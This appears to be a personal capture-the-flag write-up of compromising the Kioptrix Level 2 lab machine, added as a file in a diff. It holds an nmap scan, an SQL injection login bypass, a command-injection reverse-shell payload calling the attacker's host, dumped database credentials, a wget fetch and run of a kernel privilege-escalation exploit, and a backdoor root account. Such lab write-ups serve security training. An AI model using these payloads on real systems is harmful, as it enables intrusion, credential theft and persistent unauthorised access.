@@ -1,0 +1,140 @@
+IP - 10.0.2.15
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+nmap result
+
+┌──(root㉿kali)-[~/Desktop/vulhub/kioptrix_level2]
+└─# cat nmap_all_port.txt 
+# Nmap 7.93 scan initiated Fri Feb 10 20:59:41 2023 as: nmap -sC -sV -p- -oN nmap_all_port.txt 10.0.2.15
+Nmap scan report for 10.0.2.15
+Host is up (0.000084s latency).
+Not shown: 65528 closed tcp ports (reset)
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
+|_sshv1: Server supports SSHv1
+| ssh-hostkey: 
+|   1024 8f3e8b1e5863fecf27a318093b52cf72 (RSA1)
+|   1024 346b453dbacecab25355ef1e43703836 (DSA)
+|_  1024 684d8cbbb65abd7971b87147ea004261 (RSA)
+80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+|_http-server-header: Apache/2.0.52 (CentOS)
+111/tcp  open  rpcbind  2 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2            111/tcp   rpcbind
+|   100000  2            111/udp   rpcbind
+|   100024  1            953/udp   status
+|_  100024  1            956/tcp   status
+443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_DES_64_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC4_64_WITH_MD5
+|_    SSL2_RC2_128_CBC_WITH_MD5
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2009-10-08T00:10:47
+|_Not valid after:  2010-10-08T00:10:47
+|_http-server-header: Apache/2.0.52 (CentOS)
+|_ssl-date: 2023-02-10T19:30:04+00:00; +5h00m00s from scanner time.
+631/tcp  open  ipp      CUPS 1.1
+|_http-title: 403 Forbidden
+| http-methods: 
+|_  Potentially risky methods: PUT
+|_http-server-header: CUPS/1.1
+956/tcp  open  status   1 (RPC #100024)
+3306/tcp open  mysql    MySQL (unauthorized)
+MAC Address: 08:00:27:1A:B7:2F (Oracle VirtualBox virtual NIC)
+
+Host script results:
+|_clock-skew: 4h59m59s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Feb 10 21:00:08 2023 -- 1 IP address (1 host up) scanned in 27.00 seconds
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Found admin login page
+
+Simply bypass the login page with sqli payload:
+
+username - admin' OR 1=1 -- -
+password - admin
+
+Found command injection page 
+
+http://10.0.2.15/index.php
+
+Got reverse shell with this payload:
+
+; sh -i >& /dev/tcp/10.0.2.4/4444 0>&1
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Got mysql password from index.php login page source code:
+
+mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
+
+Got username and password from database:
+
+mysql> select * from users;
++------+----------+------------+
+| id   | username | password   |
++------+----------+------------+
+|    1 | admin    | 5afac8d85f |
+|    2 | john     | 66lajGGbla |
++------+----------+------------+
+2 rows in set (0.00 sec)
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Priv Escalation
+
+After running linpeas.sh, I found CentOs Version 4.5 and linux 2.6.9. So, I research about kernal exploit and found this exploit:
+
+https://www.exploit-db.com/exploits/9545
+
+I download it and transfer to victim machine:
+
+┌──(root㉿kali)-[~/Desktop/vulhub/kioptrix_level2]
+└─# python2 -m SimpleHTTPServer 8888
+Serving HTTP on 0.0.0.0 port 8888 ...
+10.0.2.15 - - [10/Feb/2023 22:39:21] "GET /exploit.c HTTP/1.0" 200 -
+
+victim machine:
+
+bash-3.00$ wget http://10.0.2.4:8888/exploit.c
+--16:09:20--  http://10.0.2.4:8888/exploit.c
+           => `exploit.c'
+Connecting to 10.0.2.4:8888... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 9,422 (9.2K) [text/plain]
+
+100%[====================================>] 9,422         --.--K/s             
+
+16:09:20 (691.19 MB/s) - `exploit.c' saved [9422/9422]
+
+bash-3.00$ gcc exploit.c -o exploit
+bash-3.00$ ./exploit 
+sh-3.00# id
+uid=0(root) gid=0(root) groups=48(apache)
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Add new user as root 
+
+root@vulnix:~# useradd -ou 0 -g 0 lol
+root@vulnix:~# passwd lol
+Enter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+
+user - lol
+password - test1234
